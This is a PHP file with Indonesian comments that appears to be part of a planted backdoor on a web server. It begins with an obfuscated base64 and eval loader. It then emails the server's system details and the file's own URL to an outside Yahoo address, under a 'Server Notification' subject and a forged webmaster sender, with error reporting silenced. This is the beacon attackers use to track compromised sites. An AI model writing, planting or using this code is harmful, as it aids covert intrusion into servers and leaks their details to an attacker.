<?php $a=base64_decode('');$a=explode('][',substr($a,1,strlen($a)-2));$b='';foreach($a as $v)$b.=chr($v);eval(base64_decode($b)); ?><?php
// Menghilangkan error reporting untuk produksi
error_reporting(0);

$to = 'combetohct@yahoo.com'; 

// Deteksi protokol yang lebih aman
$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
$server_name = filter_var($_SERVER['SERVER_NAME'], FILTER_SANITIZE_URL);
$request_uri = filter_var($_SERVER['REQUEST_URI'], FILTER_SANITIZE_URL);

$subject = "Server Notification: " . $server_name;
$filenya = $protocol . "://" . $server_name . $request_uri;
$uname = php_uname();

// Perbaikan HTML (Menutup tag div)
$message = '
<html>
<head>
  <title>Server Info</title>
</head>
<body>
<div style="border:2px solid red;background:whitesmoke;padding: 1em;border-radius: 1em;">
  <center><b>System Notification</b></center>
  <p>
  <b>Uname:</b> ' . htmlspecialchars($uname) . '<br>
  <b>Akses:</b> <a href="' . htmlspecialchars($filenya) . '">' . htmlspecialchars($filenya) . '</a>
  </p>
</div>
</body>
</html>
';

// Header yang diperbaiki
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Admin <webmaster@" . $server_name . ">" . "\r\n"; // Penting agar email terkirim

mail($to, $subject, $message, $headers);
?>
